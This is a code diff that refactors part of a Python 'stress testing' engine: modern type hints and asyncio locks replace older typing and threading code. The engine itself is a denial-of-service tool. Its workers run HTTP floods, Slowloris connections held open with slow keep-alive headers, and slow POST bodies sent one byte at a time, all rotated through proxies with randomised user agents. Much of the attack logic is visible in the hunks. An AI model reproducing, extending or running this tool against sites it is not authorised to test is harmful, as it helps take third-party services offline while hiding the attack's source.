@@ -11,16 +11,15 @@ Supports:
 - Randomized mixed attacks
 """
 import asyncio
-import aiohttp
+import logging
 import random
 import string
 import time
-import logging
+from collections.abc import Callable
 from dataclasses import dataclass, field
-from typing import List, Optional, Callable, Dict, Any
 from enum import Enum
-from concurrent.futures import ThreadPoolExecutor
-import threading
+
+import aiohttp
 
 from .models import ProxyConfig
 
@@ -56,7 +55,7 @@ class StressConfig:
     use_random_payload: bool = True
     custom_payload: str = ""
     # Headers
-    custom_headers: Dict[str, str] = field(default_factory=dict)
+    custom_headers: dict[str, str] = field(default_factory=dict)
     randomize_user_agent: bool = True
     # Slowloris specific
     slowloris_socket_count: int = 200
@@ -83,9 +82,9 @@ class StressStats:
     start_time: float = 0.0
     elapsed_seconds: float = 0.0
     # Response code breakdown
-    response_codes: Dict[int, int] = field(default_factory=dict)
+    response_codes: dict[int, int] = field(default_factory=dict)
     # Error types
-    error_types: Dict[str, int] = field(default_factory=dict)
+    error_types: dict[str, int] = field(default_factory=dict)
 
 
 # Common User-Agent strings for randomization
@@ -113,9 +112,9 @@ class StressEngine:
     def __init__(
         self,
         config: StressConfig,
-        proxies: List[ProxyConfig],
-        on_stats_update: Optional[Callable[[StressStats], None]] = None,
-        on_log: Optional[Callable[[str], None]] = None,
+        proxies: list[ProxyConfig],
+        on_stats_update: Callable[[StressStats], None] | None = None,
+        on_log: Callable[[str], None] | None = None,
     ):
         self.config = config
         self.proxies = [p for p in proxies if p.protocol.upper() == "HTTP"]
@@ -129,16 +128,16 @@ class StressEngine:
         self._pause_event = asyncio.Event()
         self._pause_event.set()  # Not paused initially
 
-        self._latencies: List[float] = []
-        self._latency_lock = threading.Lock()
-        self._stats_lock = threading.Lock()
+        self._latencies: list[float] = []
+        self._latency_lock = asyncio.Lock()
+        self._stats_lock = asyncio.Lock()
         self._proxy_index = 0
-        self._proxy_lock = threading.Lock()
+        self._proxy_lock = asyncio.Lock()
         self._used_proxies: set = set()
 
         # Rate limiting
-        self._request_times: List[float] = []
-        self._rps_lock = threading.Lock()
+        self._request_times: list[float] = []
+        self._rps_lock = asyncio.Lock()
 
         self.logger = logging.getLogger(__name__)
 
@@ -148,12 +147,12 @@ class StressEngine:
         if self.on_log:
             self.on_log(message)
 
-    def _get_next_proxy(self) -> Optional[ProxyConfig]:
+    async def _get_next_proxy(self) -> ProxyConfig | None:
         """Get next proxy in rotation."""
         if not self.proxies:
             return None
 
-        with self._proxy_lock:
+        async with self._proxy_lock:
             proxy = self.proxies[self._proxy_index]
             self._proxy_index = (self._proxy_index + 1) % len(self.proxies)
             self._used_proxies.add((proxy.host, proxy.port))
@@ -164,7 +163,7 @@ class StressEngine:
         """Generate random payload of specified size."""
         return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
 
-    def _get_headers(self) -> Dict[str, str]:
+    def _get_headers(self) -> dict[str, str]:
         """Get headers for request."""
         headers = {
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -184,13 +183,13 @@ class StressEngine:
 
         return headers
 
-    def _should_rate_limit(self) -> bool:
+    async def _should_rate_limit(self) -> bool:
         """Check if we should rate limit based on RPS setting."""
         if self.config.rps_limit <= 0:
             return False
 
         current_time = time.time()
-        with self._rps_lock:
+        async with self._rps_lock:
             # Remove old timestamps (older than 1 second)
             self._request_times = [t for t in self._request_times if current_time - t < 1.0]
 
@@ -201,7 +200,7 @@ class StressEngine:
 
         return False
 
-    def _update_stats(
+    async def _update_stats(
         self,
         success: bool,
         latency_ms: float = 0,
@@ -211,8 +210,8 @@ class StressEngine:
         error_type: str = "",
         proxy_failed: bool = False,
     ):
-        """Update statistics thread-safely."""
-        with self._stats_lock:
+        """Update statistics in async-safe manner."""
+        async with self._stats_lock:
             self.stats.requests_sent += 1
 
             if success:
@@ -235,7 +234,7 @@ class StressEngine:
             self.stats.proxies_used = len(self._used_proxies)
 
         if latency_ms > 0:
-            with self._latency_lock:
+            async with self._latency_lock:
                 self._latencies.append(latency_ms)
                 # Keep only last 1000 for rolling average
                 if len(self._latencies) > 1000:
@@ -261,11 +260,11 @@ class StressEngine:
                 break
 
             # Rate limiting
-            if self._should_rate_limit():
+            if await self._should_rate_limit():
                 await asyncio.sleep(0.01)
                 continue
 
-            proxy = self._get_next_proxy()
+            proxy = await self._get_next_proxy()
             proxy_url = f"http://{proxy.host}:{proxy.port}" if proxy else None
 
             start_time = time.time()
@@ -298,7 +297,7 @@ class StressEngine:
                     latency_ms = (time.time() - start_time) * 1000
                     content = await response.read()
 
-                    self._update_stats(
+                    await self._update_stats(
                         success=True,
                         latency_ms=latency_ms,
                         bytes_sent=bytes_sent + len(str(headers).encode()),
@@ -306,15 +305,15 @@ class StressEngine:
                         status_code=response.status,
                     )
 
-            except aiohttp.ClientProxyConnectionError as e:
-                self._update_stats(success=False, error_type="proxy_connection", proxy_failed=True)
-            except aiohttp.ClientConnectorError as e:
-                self._update_stats(success=False, error_type="connection")
+            except aiohttp.ClientProxyConnectionError:
+                await self._update_stats(success=False, error_type="proxy_connection", proxy_failed=True)
+            except aiohttp.ClientConnectorError:
+                await self._update_stats(success=False, error_type="connection")
             except asyncio.TimeoutError:
-                self._update_stats(success=False, error_type="timeout")
+                await self._update_stats(success=False, error_type="timeout")
             except Exception as e:
                 error_type = type(e).__name__
-                self._update_stats(success=False, error_type=error_type)
+                await self._update_stats(success=False, error_type=error_type)
 
     async def _slowloris_worker(self, worker_id: int):
         """
@@ -328,7 +327,7 @@ class StressEngine:
             if self.stats.elapsed_seconds >= self.config.duration_seconds:
                 break
 
-            proxy = self._get_next_proxy()
+            proxy = await self._get_next_proxy()
 
             try:
                 # Parse target URL
@@ -357,7 +356,7 @@ class StressEngine:
                 writer.write(initial_headers.encode())
                 await writer.drain()
 
-                self._update_stats(success=True, bytes_sent=len(initial_headers))
+                await self._update_stats(success=True, bytes_sent=len(initial_headers))
 
                 # Keep connection alive with slow headers
                 while self._running and not self._stop_event.is_set():
@@ -371,7 +370,7 @@ class StressEngine:
                     try:
                         writer.write(keep_alive_header.encode())
                         await writer.drain()
-                        self._update_stats(success=True, bytes_sent=len(keep_alive_header))
+                        await self._update_stats(success=True, bytes_sent=len(keep_alive_header))
                     except Exception:
                         break
 
@@ -381,11 +380,11 @@ class StressEngine:
                 await writer.wait_closed()
 
             except asyncio.TimeoutError:
-                self._update_stats(success=False, error_type="timeout")
+                await self._update_stats(success=False, error_type="timeout")
             except ConnectionRefusedError:
-                self._update_stats(success=False, error_type="connection_refused")
+                await self._update_stats(success=False, error_type="connection_refused")
             except Exception as e:
-                self._update_stats(success=False, error_type=type(e).__name__)
+                await self._update_stats(success=False, error_type=type(e).__name__)
 
             # Small delay before reconnecting
             await asyncio.sleep(0.1)
@@ -402,7 +401,7 @@ class StressEngine:
             if self.stats.elapsed_seconds >= self.config.duration_seconds:
                 break
 
-            proxy = self._get_next_proxy()
+            proxy = await self._get_next_proxy()
 
             try:
                 from urllib.parse import urlparse
@@ -436,7 +435,7 @@ class StressEngine:
 
                 writer.write(headers.encode())
                 await writer.drain()
-                self._update_stats(success=True, bytes_sent=len(headers))
+                await self._update_stats(success=True, bytes_sent=len(headers))
 
                 # Send body very slowly, one byte at a time
                 bytes_sent_body = 0
@@ -452,7 +451,7 @@ class StressEngine:
                         writer.write(chunk.encode())
                         await writer.drain()
                         bytes_sent_body += len(chunk)
-                        self._update_stats(success=True, bytes_sent=len(chunk))
+                        await self._update_stats(success=True, bytes_sent=len(chunk))
                     except Exception:
                         break
 
@@ -462,17 +461,17 @@ class StressEngine:
                 await writer.wait_closed()
 
             except asyncio.TimeoutError:
-                self._update_stats(success=False, error_type="timeout")
+                await self._update_stats(success=False, error_type="timeout")
             except ConnectionRefusedError:
-                self._update_stats(success=False, error_type="connection_refused")
+                await self._update_stats(success=False, error_type="connection_refused")
             except Exception as e:
-                self._update_stats(success=False, error_type=type(e).__name__)
+                await self._update_stats(success=False, error_type=type(e).__name__)
 
             await asyncio.sleep(0.1)
 
     async def _stats_reporter(self):
         """Periodically report stats to callback."""
-        last_report = time.time()
+        time.time()
 
         while self._running and not self._stop_event.is_set():
             await asyncio.sleep(0.5)  # Update every 500ms
@@ -496,15 +495,15 @@ class StressEngine:
             self._log("ERROR: No HTTP proxies available for stress testing!")
             return
 
-        self._log(f"=" * 60)
-        self._log(f"STRESS TEST STARTING")
+        self._log("=" * 60)
+        self._log("STRESS TEST STARTING")
         self._log(f"Target: {self.config.target_url}")
         self._log(f"Attack Type: {self.config.attack_type.value}")
         self._log(f"Method: {self.config.method.value}")
         self._log(f"Threads: {self.config.threads}")
         self._log(f"Duration: {self.config.duration_seconds}s")
         self._log(f"HTTP Proxies: {len(self.proxies)}")
-        self._log(f"=" * 60)
+        self._log("=" * 60)
 
         self._running = True
         self.stats = StressStats()
@@ -571,15 +570,15 @@ class StressEngine:
         self._running = False
 
         # Final stats report
-        self._log(f"=" * 60)
-        self._log(f"STRESS TEST COMPLETE")
+        self._log("=" * 60)
+        self._log("STRESS TEST COMPLETE")
         self._log(f"Total Requests: {self.stats.requests_sent}")
         self._log(f"Successful: {self.stats.requests_success}")
         self._log(f"Failed: {self.stats.requests_failed}")
         self._log(f"Average RPS: {self.stats.current_rps:.2f}")
         self._log(f"Avg Latency: {self.stats.avg_latency_ms:.2f}ms")
         self._log(f"Proxies Used: {self.stats.proxies_used}")
-        self._log(f"=" * 60)
+        self._log("=" * 60)
 
         if self.on_stats_update:
             self.on_stats_update(self.stats)
